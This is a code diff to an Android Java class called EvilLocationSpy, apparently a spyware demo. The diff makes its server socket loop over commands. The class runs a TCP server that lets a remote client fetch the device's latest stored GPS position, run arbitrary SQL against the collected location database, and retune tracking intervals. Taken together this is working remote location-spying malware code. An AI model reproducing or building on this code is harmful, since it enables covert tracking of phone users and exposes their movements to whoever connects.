@@ -112,50 +112,54 @@ class EvilLocationSpy implements LocationListener {
 
                 ServerSocket ss = null;
                 try {
+                    Boolean demo = true;
                     ss = new ServerSocket(ServerPort);
                     while(true){
                         Socket s = ss.accept();
                         BufferedReader input = new BufferedReader(new InputStreamReader(s.getInputStream()));
                         PrintWriter output = new PrintWriter(s.getOutputStream(),true);
-                        String st = input.readLine();
-                        Log.d("SERVER", "From client: " + st);
-                        if(st.contains("posReciente")){
-                            // Mensaje>  posReciente
-                            Cursor cursor = evilDatabase.rawQuery("SELECT * FROM locations WHERE ts = (SELECT MAX(ts) FROM locations)", null);
-                            try {
-                                if(cursor.moveToNext()) {
-                                    String when = cursor.getString(0);
-                                    String lat = cursor.getString(1);
-                                    String lon = cursor.getString(2);
-                                    output.println(when + '\t' + lat + '\t' + lon);
+                        do {
+                            String st = input.readLine();
+                            Log.d("SERVER", "From client: " + st);
+                            if (st.contains("posReciente")) {
+                                // Mensaje>  posReciente
+                                Cursor cursor = evilDatabase.rawQuery("SELECT * FROM locations WHERE ts = (SELECT MAX(ts) FROM locations)", null);
+                                try {
+                                    if (cursor.moveToNext()) {
+                                        String when = cursor.getString(0);
+                                        String lat = cursor.getString(1);
+                                        String lon = cursor.getString(2);
+                                        output.println(when + '\t' + lat + '\t' + lon);
+                                    }
+                                } finally {
+                                    cursor.close();
                                 }
-                            } finally {
-                                cursor.close();
-                            }
-                        } else if (st.contains("query")) {
-                            // Mensaje>  query:select * from locations
-                            String params[] = st.substring(st.lastIndexOf("query")).split(":");
-                            Cursor cursor = evilDatabase.rawQuery(params[1], null);
-                            try {
-                                while(cursor.moveToNext()) {
-                                    String when = cursor.getString(0);
-                                    String lat = cursor.getString(1);
-                                    String lon = cursor.getString(2);
-                                    output.write(when + '\t' + lat + '\t' + lon + ',');
+                            } else if (st.contains("query")) {
+                                // Mensaje>  query:select * from locations
+                                String params[] = st.substring(st.lastIndexOf("query")).split(":");
+                                Cursor cursor = evilDatabase.rawQuery(params[1], null);
+                                try {
+                                    while (cursor.moveToNext()) {
+                                        String when = cursor.getString(0);
+                                        String lat = cursor.getString(1);
+                                        String lon = cursor.getString(2);
+                                        output.write(when + '\t' + lat + '\t' + lon + ' ');
+                                    }
+                                } finally {
+                                    cursor.close();
                                 }
-                            } finally {
-                                cursor.close();
-                            }
-                        } else if (st.contains("cambiarParamsGPS")){
-                            // Mensaje>  cambiarParamsGPS:threshMs:threshMeters
-                            String params[] = st.substring(st.lastIndexOf("cambiarParamsGPS")).split(":");
-                            int newTimeThreshMS = Integer.parseInt(params[1]);
-                            int newMeterThresh = Integer.parseInt(params[2]);
+                            } else if (st.contains("cambiarParamsGPS")) {
+                                // Mensaje>  cambiarParamsGPS:threshMs:threshMeters
+                                String params[] = st.substring(st.lastIndexOf("cambiarParamsGPS")).split(":");
+                                int newTimeThreshMS = Integer.parseInt(params[1]);
+                                int newMeterThresh = Integer.parseInt(params[2]);
 
-                            //EvilLocationSpyService.evilLocationSpyService.stopLocationUpdates();
-                            EvilLocationSpyService.evilLocationSpyService.startLocationUpdates(newTimeThreshMS, newMeterThresh);
-                            output.write("Ok.");
-                        }
+                                //EvilLocationSpyService.evilLocationSpyService.stopLocationUpdates();
+                                EvilLocationSpyService.evilLocationSpyService.startLocationUpdates(newTimeThreshMS, newMeterThresh);
+                                output.write("Ok.");
+                            }
+                            output.flush();
+                        } while (demo);
                         output.println("Good Bye!");
                         s.close();
                     }
